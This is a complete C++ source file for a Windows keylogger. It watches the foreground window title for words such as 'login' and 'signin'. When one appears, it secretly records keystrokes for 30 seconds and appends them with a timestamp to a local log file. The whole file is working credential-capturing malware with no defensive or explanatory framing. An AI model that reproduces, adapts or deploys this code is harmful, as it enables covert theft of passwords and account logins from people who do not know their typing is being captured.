#include <iostream>
#include <windows.h>
#include <thread>
#include <atomic>
#include <fstream>
#include <chrono>
#include <ctime>

using namespace std;

wstring getForegroundWindowName();
string beginCapture();
bool isContainsNeededWord(wstring base_word, wstring* wordlist, int wordlist_size);
void checkForQuit();
void save(string data);

atomic<bool> keep_running(true);
wstring wordlist[] = {L"login", L"123", L"signin"};

int main() {
    thread keyboardThread(checkForQuit);

    while (keep_running) {
        wstring window_name = getForegroundWindowName();
        if (isContainsNeededWord(window_name, wordlist, size(wordlist))) {
            save(beginCapture());
            // wcout << "captured" << endl;
        }
        Sleep(100);
    }

    keyboardThread.join();
    system("pause");
    return 0;
}


void checkForQuit() {
    while (keep_running) {
        if (GetAsyncKeyState('Q') & 0x8000) { 
            keep_running = false; 
        }
        Sleep(100);
    }
}


wstring getForegroundWindowName() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd != NULL) {
        const int lenght = 256;
        wchar_t title[lenght];

        GetWindowTextW(hwnd, title, 256);
        return title;
    }
    return L"Failed to identify window name";
}


bool isContainsNeededWord(wstring base_word, wstring* wordlist, int wordlist_size) {
    for (int i = 0; i < wordlist_size; i++) {
        if (base_word.find(wordlist[i]) != wstring::npos) {
            return true;
        }
    }
    return false;
}


void save(string data) {
    fstream file("log.txt", ios::app);
    time_t now = chrono::system_clock::to_time_t(chrono::system_clock::now());
    file << data << " :: " << ctime(&now);
    file.close();
    wcout << "saved" << endl;
}


string beginCapture() {
    wcout << "detected" << endl;
    string data;
    auto start = std::chrono::system_clock::now();
    auto end = std::chrono::system_clock::now();
    std::chrono::duration<double> elapsed_seconds = end-start;
    
    while (elapsed_seconds.count() < 30) {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) { 
                switch (i) {
                    case VK_SHIFT: data += "[shift]"; break;
                    case VK_BACK: data.pop_back(); break;
                    case VK_RETURN: data += "[enter]"; break;
                    default: data +=  tolower(MapVirtualKey(i, MAPVK_VK_TO_CHAR));
                }
            }
        }
        Sleep(10);
        end = std::chrono::system_clock::now();
        elapsed_seconds = end-start;
    }
    return data;
}
